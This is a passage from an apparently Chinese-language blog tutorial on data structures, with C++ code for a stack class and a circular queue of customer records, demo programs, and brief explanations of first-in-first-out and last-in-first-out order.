class=\"code\"><pre><span class=\"line\"># include <span class=\"string\">\"MyStack.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">MyStack::MyStack(<span class=\"keyword\">int</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iSize = size;</span><br><span class=\"line\">\tm_pBuffer = <span class=\"keyword\">new</span> <span class=\"keyword\">char</span>[size];</span><br><span class=\"line\">\tm_iTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyStack::~MyStack()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> []m_pBuffer;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::stackEmpty()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"number\">0</span> == m_iTop)       <span class=\"comment\">//此处为了优秀代码，也可写成 m_iTop == 0;</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::stackFull()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iTop == m_iSize)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyStack::clearStack()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> MyStack::stackLength()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_iTop;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::push(<span class=\"keyword\">char</span> elem)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (stackFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm_pBuffer[m_iTop] = elem;</span><br><span class=\"line\">\tm_iTop++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::pop(<span class=\"keyword\">char</span> &amp;elem)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (stackEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm_iTop--;</span><br><span class=\"line\">\telem = m_pBuffer[m_iTop];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyStack::stackTraverse(<span class=\"keyword\">bool</span> isFromButtorm)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isFromButtorm)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m_iTop; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m_pBuffer[i] &lt;&lt; <span class=\"string\">\",\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = m_iTop<span class=\"number\">-1</span>; i &gt;= <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m_pBuffer[i] &lt;&lt; <span class=\"string\">\",\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>demo.cpp</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;stdlib.h&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"MyStack.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tMyStack *pStack = <span class=\"keyword\">new</span> MyStack(<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'h'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'e'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'l'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'l'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'o'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;stackTraverse(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> elem = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpStack-&gt;pop(elem);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;stackTraverse(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//pStack-&gt;clearStack();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; pStack-&gt;stackLength() &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pStack-&gt;stackEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"栈为空\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pStack-&gt;stackFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"栈为满\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> pStack;</span><br><span class=\"line\">\tpStack = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<h3 id=\"1-数据结构之队列\"><a href=\"#1-数据结构之队列\" class=\"headerlink\" title=\"1.数据结构之队列\"></a>1.数据结构之队列</h3>","more":"<p><strong>数据结构中的队列所遵循的原则是先进先出的排队原则，即先存放的先先取出。同时队列分为普通队列和环形队列，其中普通队列是非闭合队列，效率和利用率低；相反，环形队列为首尾闭合的队列，可以实现不断取出又不断放进，效率和利用率高。</strong></p>\n<p><strong>队列有列首、列尾、列容量、列长度等名词，在此不解释了。</strong></p>\n<p><strong>接下来放代码</strong><br>Customer.h中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef CUSTOMER_H</span><br><span class=\"line\"># define CUSTOMER_H</span><br><span class=\"line\"></span><br><span class=\"line\"># include &lt;<span class=\"built_in\">string</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Customer</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tCustomer(<span class=\"built_in\">string</span> name = <span class=\"string\">\"\"</span>, <span class=\"keyword\">int</span> age = <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printInfo</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">string</span> m_strName;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iAge;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p>Customer.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Customer::Customer(<span class=\"built_in\">string</span> name, <span class=\"keyword\">int</span> age)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_strName = name;</span><br><span class=\"line\">\tm_iAge = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> Customer::printInfo() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"姓名\"</span> &lt;&lt; m_strName &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"年龄\"</span> &lt;&lt; m_iAge &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>MyQueue.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include <span class=\"string\">\"MyQueue.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">MyQueue::MyQueue(<span class=\"keyword\">int</span> queueCapacity)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iQueueCapacity = queueCapacity;</span><br><span class=\"line\">\tm_pQueue = <span class=\"keyword\">new</span> Customer[m_iQueueCapacity];</span><br><span class=\"line\">\tClearQueue();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyQueue::~MyQueue()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> []m_pQueue;</span><br><span class=\"line\">\tm_pQueue = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyQueue::ClearQueue()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iHead = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iTail = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iQueueLen = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::QueueEmpty() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iQueueLen == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> MyQueue::QueueLength() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_iQueueLen;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::QueueFull() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iQueueLen == m_iQueueCapacity)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::EnQueue(Customer element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (QueueFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tm_pQueue[m_iTail] = element;</span><br><span class=\"line\">\t\tm_iTail++;</span><br><span class=\"line\">\t\tm_iTail = m_iTail % m_iQueueCapacity;</span><br><span class=\"line\">\t\tm_iQueueLen++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::DeQueue(Customer &amp;element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (QueueEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\telement = m_pQueue[m_iHead];</span><br><span class=\"line\">\t\tm_iHead++;</span><br><span class=\"line\">\t\tm_iHead = m_iHead % m_iQueueCapacity;</span><br><span class=\"line\">\t\tm_iQueueLen--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyQueue::QueueTraverse()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = m_iHead; i &lt; m_iQueueLen + m_iHead; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tm_pQueue[i%m_iQueueCapacity].printInfo();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"前面还有\"</span> &lt;&lt; (i-m_iHead) &lt;&lt; <span class=\"string\">\"人\"</span> &lt;&lt; <span class=\"built_in\">endl</span>; </span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>MyQueue.h中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef MYQUEUE_H</span><br><span class=\"line\"># define MYQUEUE_H</span><br><span class=\"line\"></span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> MyQueue</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tMyQueue(<span class=\"keyword\">int</span> queueCapacity);         <span class=\"comment\">//创建队列</span></span><br><span class=\"line\">\t<span class=\"keyword\">virtual</span> ~MyQueue();                 <span class=\"comment\">//销毁队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ClearQueue</span><span class=\"params\">()</span></span>;                  <span class=\"comment\">//清空队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">QueueEmpty</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;            <span class=\"comment\">//判空队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">QueueFull</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;             <span class=\"comment\">//判满队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">QueueLength</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;            <span class=\"comment\">//队列长度</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">EnQueue</span><span class=\"params\">(Customer element)</span></span>;     <span class=\"comment\">//新元素入队</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">DeQueue</span><span class=\"params\">(Customer &amp;element)</span></span>;    <span class=\"comment\">//首元素出队</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QueueTraverse</span><span class=\"params\">()</span></span>;               <span class=\"comment\">//遍历队列</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tCustomer *m_pQueue;                     <span class=\"comment\">//队列数组指针</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iQueueLen;                        <span class=\"comment\">//队列元素个数</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iQueueCapacity;                   <span class=\"comment\">//队列数组容量</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iHead;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTail;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p>demo.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"># include &lt;stdlib.h&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"MyQueue.h\"</span></span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tMyQueue *p = <span class=\"keyword\">new</span> MyQueue(<span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c1</span><span class=\"params\">(<span class=\"string\">\"张三\"</span>,<span class=\"number\">20</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c2</span><span class=\"params\">(<span class=\"string\">\"李四\"</span>,<span class=\"number\">30</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c3</span><span class=\"params\">(<span class=\"string\">\"王五\"</span>,<span class=\"number\">25</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tp-&gt;EnQueue(c1);</span><br><span class=\"line\">\tp-&gt;EnQueue(c2);</span><br><span class=\"line\">\tp-&gt;EnQueue(c3);</span><br><span class=\"line\"></span><br><span class=\"line\">\tp-&gt;QueueTraverse();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c4</span><span class=\"params\">(<span class=\"string\">\"\"</span>,<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\">\tp-&gt;DeQueue(c4);</span><br><span class=\"line\">\tc4.printInfo();</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-数据结构之栈\"><a href=\"#2-数据结构之栈\" class=\"headerlink\" title=\"2.数据结构之栈\"></a>2.数据结构之栈</h3><p><strong>讲真，假期学习真的好难，我好不容易静下心来再学，其实之前已经学了，只是博客没做记录，今天补上。栈是很简单的模型，就是相当于一个瓶子，放东西进去，先放的在下面，后放的在上面，所以遵循后进先出原则，栈的栈底始终不变，栈顶随放入数量增加而上升。差不多就这些，今天的代码很简单，遵循我写代码不麻烦，理解容易原则</strong></p>\n<p><strong>接下来放代码</strong><br><strong>MyStack.h</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef MYSTACK_H</span><br><span class=\"line\"># define MYSTACK_H</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> MyStack</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span 